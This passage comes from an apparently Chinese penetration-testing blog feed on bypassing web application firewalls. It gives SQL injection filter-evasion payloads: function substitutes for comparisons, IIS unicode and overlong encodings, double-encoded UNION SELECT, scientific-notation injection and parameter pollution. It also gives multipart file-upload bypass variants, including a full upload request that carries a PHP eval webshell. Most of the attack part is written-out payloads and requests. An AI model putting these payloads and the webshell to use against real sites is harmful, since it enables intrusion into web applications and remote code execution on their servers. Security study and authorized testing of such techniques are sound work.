class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> | root@localhost |</span><br><span class="line">+---+---+---+----------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h6 id="if中的逗号"><a href="#if中的逗号" class="headerlink" title="if中的逗号"></a>if中的逗号</h6><p>使用<code>case then</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">case</span> when <span class="number">1</span>=<span class="number">1</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end;</span><br><span class="line">+---------------------------------+</span><br><span class="line">| <span class="keyword">case</span> when <span class="number">1</span>=<span class="number">1</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               <span class="number">1</span> |</span><br><span class="line">+---------------------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="keyword">case</span> when <span class="number">1</span>=<span class="number">0</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end;</span><br><span class="line">+---------------------------------+</span><br><span class="line">| <span class="keyword">case</span> when <span class="number">1</span>=<span class="number">0</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               <span class="number">0</span> |</span><br><span class="line">+---------------------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="if替换"><a href="#if替换" class="headerlink" title="if替换"></a>if替换</h4><p><code>case when</code></p><h4 id="比较表达式代替"><a href="#比较表达式代替" class="headerlink" title="比较表达式代替"></a>比较表达式代替</h4><h5 id="使用相关函数替换等于"><a href="#使用相关函数替换等于" class="headerlink" title="使用相关函数替换等于"></a>使用相关函数替换等于</h5><h6 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT strcmp(ascii(<span class="string">&#x27;a&#x27;</span>),<span class="number">97</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| strcmp(ascii(<span class="string">&#x27;a&#x27;</span>),<span class="number">97</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     <span class="number">0</span> |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><h6 id="find-in-set"><a href="#find-in-set" class="headerlink" title="find_in_set"></a>find_in_set</h6><p>str 要查询的字符串</p><p>strlist 字段名 参数以”,”分隔 如 (1,2,6,8,10,22)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT find_in_set(ascii(<span class="string">&#x27;a&#x27;</span>), <span class="number">97</span>);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| find_in_set(ascii(<span class="string">&#x27;a&#x27;</span>), <span class="number">97</span>) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|                           <span class="number">1</span> |</span><br><span class="line">+-----------------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h6 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ord(<span class="string">&#x27;a&#x27;</span>) regexp <span class="number">97</span>;</span><br><span class="line">+--------------------+</span><br><span class="line">| ord(<span class="string">&#x27;a&#x27;</span>) regexp <span class="number">97</span> |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  <span class="number">1</span> |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ord(<span class="string">&#x27;a&#x27;</span>) regexp <span class="number">98</span>;</span><br><span class="line">+--------------------+</span><br><span class="line">| ord(<span class="string">&#x27;a&#x27;</span>) regexp <span class="number">98</span> |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  <span class="number">0</span> |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h6 id="least、greatest"><a href="#least、greatest" class="headerlink" title="least、greatest"></a>least、greatest</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select least(<span class="number">3</span>,<span class="string">&#x27;2,4,5,6&#x27;</span>);</span><br><span class="line">+--------------------+</span><br><span class="line">| least(<span class="number">3</span>,<span class="string">&#x27;2,4,5,6&#x27;</span>) |</span><br><span class="line">+--------------------+</span><br><span class="line">| <span class="number">2</span>                  |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">1</span> row in set, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select least(ascii(<span class="string">&#x27;a&#x27;</span>),<span class="number">97</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| least(ascii(<span class="string">&#x27;a&#x27;</span>),<span class="number">97</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                   <span class="number">97</span> |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select least(ascii(<span class="string">&#x27;a&#x27;</span>),<span class="number">96</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| least(ascii(<span class="string">&#x27;a&#x27;</span>),<span class="number">96</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                   <span class="number">96</span> |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h6 id="between-n-and-m"><a href="#between-n-and-m" class="headerlink" title="between n and m"></a>between n and m</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(<span class="string">&#x27;a&#x27;</span>) between <span class="number">1</span> <span class="keyword">and</span> <span class="number">100</span>;</span><br><span class="line">+------------------------------+</span><br><span class="line">| ascii(<span class="string">&#x27;a&#x27;</span>) between <span class="number">1</span> <span class="keyword">and</span> <span class="number">100</span> |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            <span class="number">1</span> |</span><br><span class="line">+------------------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(<span class="string">&#x27;a&#x27;</span>) between <span class="number">98</span> <span class="keyword">and</span> <span class="number">100</span>;</span><br><span class="line">+-------------------------------+</span><br><span class="line">| ascii(<span class="string">&#x27;a&#x27;</span>) between <span class="number">98</span> <span class="keyword">and</span> <span class="number">100</span> |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                             <span class="number">0</span> |</span><br><span class="line">+-------------------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h3><h4 id="特性"><a href="#特性" class="headerlink" title="%特性"></a>%特性</h4><p>asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉。</p><h4 id="u特性"><a href="#u特性" class="headerlink" title="%u特性"></a>%u特性</h4><p>iis支持unicode的解析，当我们请求的url存在unicode字符串的话iis会自动将其转换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">字母a：</span><br><span class="line">%u0000</span><br><span class="line">%u0041</span><br><span class="line">%u0061</span><br><span class="line">%u00aa</span><br><span class="line">%u00e2</span><br><span class="line">单引号：</span><br><span class="line">%u0027</span><br><span class="line">%u02b9</span><br><span class="line">%u02bc</span><br><span class="line">%u02c8</span><br><span class="line">%u2032</span><br><span class="line">%uff07</span><br><span class="line">%c0%27</span><br><span class="line">%c0%a7</span><br><span class="line">%e0%80%a7</span><br><span class="line">空白：</span><br><span class="line">%u0020</span><br><span class="line">%uff00</span><br><span class="line">%c0%20</span><br><span class="line">%c0%a0</span><br><span class="line">%e0%80%a0</span><br><span class="line">左括号(：</span><br><span class="line">%u0028</span><br><span class="line">%uff08</span><br><span class="line">%c0%28</span><br><span class="line">%c0%a8</span><br><span class="line">%e0%80%a8</span><br><span class="line">右括号)：</span><br><span class="line">%u0029</span><br><span class="line">%uff09</span><br><span class="line">%c0%29</span><br><span class="line">%c0%a9</span><br><span class="line">%e0%80%a9</span><br></pre></td></tr></table></figure><h4 id="畸形协议-amp-请求"><a href="#畸形协议-amp-请求" class="headerlink" title="畸形协议&amp;请求"></a>畸形协议&amp;请求</h4><p>waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，当我们将协议随便定义时也是可以的。</p><h4 id="通用的特性"><a href="#通用的特性" class="headerlink" title="通用的特性"></a>通用的特性</h4><p>HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。</p><p>比如提交：<code>id=1&amp;id=2&amp;id=3</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Asp.net + iis：id&#x3D;1,2,3</span><br><span class="line">Asp + iis：id&#x3D;1,2,3</span><br><span class="line">Php + apache：id&#x3D;3</span><br></pre></td></tr></table></figure><p>容器特性：</p><ul><li>%特性：</li></ul><p>asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉</p><h3 id="功能特性"><a href="#功能特性" class="headerlink" title="功能特性"></a>功能特性</h3><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><p>在某些sql查询字符后面加上特殊字符即可绕过waf，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select+char</span><br><span class="line">union+char</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+、-、@、！、&#39;、&quot;、～、&#123;、</span><br></pre></td></tr></table></figure><p>其中减号、加号可以带出正常数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">12</span>:<span class="number">33</span>:<span class="number">38</span>] select * <span class="keyword">from</span> math <span class="comment">//+</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">46</span>:<span class="number">38</span>] select-id <span class="keyword">from</span> math <span class="comment">//-</span></span><br></pre></td></tr></table></figure><p>@、！、’、”sql语句可以正常执行但是不会带出正常数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">12</span>:<span class="number">46</span>:<span class="number">29</span>] select!id <span class="keyword">from</span> math</span><br><span class="line">[<span class="number">12</span>:<span class="number">46</span>:<span class="number">49</span>] select@id <span class="keyword">from</span> math</span><br><span class="line">[<span class="number">12</span>:<span class="number">49</span>:<span class="number">30</span>] select<span class="string">&#x27;id&#x27;</span> <span class="keyword">from</span> math</span><br><span class="line">[<span class="number">12</span>:<span class="number">49</span>:<span class="number">40</span>] select<span class="string">&quot;id&quot;</span> <span class="keyword">from</span> math</span><br></pre></td></tr></table></figure><p>带出数据不正常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/htdocs/php/listt.php:<span class="number">11</span>:</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">18</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">&#x27;@id&#x27;</span> =&gt; <span class="literal">null</span></span><br><span class="line">  <span class="number">1</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">&#x27;@id&#x27;</span> =&gt; <span class="literal">null</span></span><br><span class="line">  <span class="number">2</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">&#x27;@id&#x27;</span> =&gt; <span class="literal">null</span></span><br><span class="line">  <span class="number">3</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">&#x27;@id&#x27;</span> =&gt; <span class="literal">null</span></span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>对字符使用十六进制编码,这里将\x转换成%。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome-extension:&#x2F;&#x2F;mflanociobpenleccopmoanpdbcjcanm&#x2F;index.html#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;listt.php?sql&#x3D;sel%65ct * from m%61th</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[15:48:50] select * from math</span><br></pre></td></tr></table></figure><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>对符号进行二次编码绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%252f%252a*&#x2F;UNION%252f%252a&#x2F;SELECT </span><br></pre></td></tr></table></figure><h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><h4 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1e1union select user,password</span><br></pre></td></tr></table></figure><h4 id="大小写混合"><a href="#大小写混合" class="headerlink" title="大小写混合"></a>大小写混合</h4><p>太简单，不详细介绍。</p><h4 id="concat-ws-、与concat-函数"><a href="#concat-ws-、与concat-函数" class="headerlink" title="concat_ws()、与concat()函数"></a>concat_ws()、与concat()函数</h4><p>常用于禁用某些特殊关键字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  concat_ws(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;concat&#x27;</span>);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| concat_ws(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;concat&#x27;</span>) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| groupconcat                    |</span><br><span class="line">+--------------------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select  concat(<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;concat&#x27;</span>);</span><br><span class="line">+--------------------------+</span><br><span class="line">| concat(<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;concat&#x27;</span>) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| groupconcat              |</span><br><span class="line">+--------------------------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h2 id="文件上传过WAF"><a href="#文件上传过WAF" class="headerlink" title="文件上传过WAF"></a>文件上传过WAF</h2><h4 id="文件上传特征"><a href="#文件上传特征" class="headerlink" title="文件上传特征"></a>文件上传特征</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /<span class="number">1.</span>php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">80.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">80.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------163061546526053208562478091686</span></span><br><span class="line"><span class="comment">Content-Length: 367</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1:8888</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8888/1.php</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------163061546526053208562478091686</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------163061546526053208562478091686</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit_x&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">upload</span></span><br><span class="line"><span class="comment">-----------------------------163061546526053208562478091686--</span></span><br></pre></td></tr></table></figure><p>从中获取特征为：</p><ul><li>请求Header中Content-Type存在以下特征：<ul><li><code>multipart/form-data</code>（表示该请求是一个文件上传请求）</li><li>存在boundary字符串（作用为分隔符，以区分POST数据）</li></ul></li><li>POST的内容存在以下特征：<ul><li>Content-Disposition</li><li>name</li><li>filename</li></ul></li><li>POST中的boundary的值就是Content-Type的值在最前面加了两个<code>--</code>，除了最后标识结束的boundary</li><li>最后标识结束的boundary最后默认会多出两个<code>--</code>（测试时，最后一行的boundary删掉也能成功上传）</li></ul><h3 id="WAF如何拦截"><a href="#WAF如何拦截" class="headerlink" title="WAF如何拦截"></a>WAF如何拦截</h3><p>waf对数据包进行解析，有的waf解析文件名、有的waf解析文件内容。</p><ol><li>获取Request Header里的<code>Content-Type</code>值中获取boundary值</li><li>根据第一步的boundary值，解析POST数据，获取文件名</li><li>判断文件名是否在拦截黑名单内</li></ol><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><ul><li><p>去掉引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;file_x; filename&#x3D;&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name&#x3D;file_x; filename&#x3D;xx.php</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;xx.php</span><br></pre></td></tr></table></figure></li><li><p>多加一个引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;100x100.jsp&quot;&quot;</span><br></pre></td></tr></table></figure></li><li><p>双引号变成单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&#39;file_x&#39;; filename&#x3D;&#39;xx.php&#39;</span><br></pre></td></tr></table></figure></li><li><p>大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对这三个固定的字符串进行大小写转换</span><br><span class="line"></span><br><span class="line">Content-Disposition</span><br><span class="line">name</span><br><span class="line">filename</span><br></pre></td></tr></table></figure></li><li><p>在<code>:</code> <code>;</code> <code>=</code>添加1个或者多个空格</p></li><li><p>去掉或修改Content-Disposition值</p><p>有的WAF在解析的时候，认为<code>Content-Disposition</code>值一定是<code>form-data</code>，造成绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name&#x3D;&#39;file_x&#39;; filename&#x3D;&#39;xx.php&#39;</span><br></pre></td></tr></table></figure></li><li><p>交换name和filename的顺序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename&#x3D;&quot;xx.php&quot;; name&#x3D;file_x</span><br></pre></td></tr></table></figure></li><li><p>多个boundary</p><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;&quot;test.txt&quot;</span><br><span class="line">Content-Type: text&#x2F;javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; filename&#x3D;&quot;test.php&quot;</span><br><span class="line">Content-Type: text&#x2F;javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit_x&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2--</span><br></pre></td></tr></table></figure></li><li><p>多个filename</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</span><br></pre></td></tr></table></figure></li><li><p>多个分号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件解析时，可能解析不到文件名，导致绕过。</span><br></pre></td></tr></table></figure></li><li><p>multipart/form-DATA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-DATA</span><br></pre></td></tr></table></figure></li><li><p>filename换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_x&quot;; file</span><br><span class="line">name&#x3D;&quot;test.php&quot;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fi</span><br><span class="line">lename</span><br></pre></td></tr></table></figure></li><li><p>name和filename添加任意字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name&#x3D;&quot;file_x&quot;; bypass waf upload; filename&#x3D;&quot;test.php&quot;; </span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;渗透测试–waf绕过&quot;&gt;&lt;a href=&quot;#渗透测试–waf绕过&quot; class=&quot;headerlink&quot; title=&quot;渗透测试–waf绕过&quot;&gt;&lt;/a&gt;渗透测试–waf绕过&lt;/h1&gt;&lt;h2 id=&quot;waf&quot;&gt;&lt;a href=&quot;#waf&quot; class=&quot;header</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--脚本权限维持之脚本隐藏</title>
    <link href="http://s1eady.top/2020/11/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E8%84%9A%E6%9C%AC%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E8%84%9A%E6%9C%AC%E9%9A%90%E8%97%8F/"/>
    <id>http://s1eady.top/2020/11/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E8%84%9A%E6%9C%AC%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E8%84%9A%E6%9C%AC%E9%9A%90%E8%97%8F/</id>
    <published>2020-11-24T03:01:14.000Z</published>
    <updated>2020-11-25T03:01:47.019Z</updated>
    
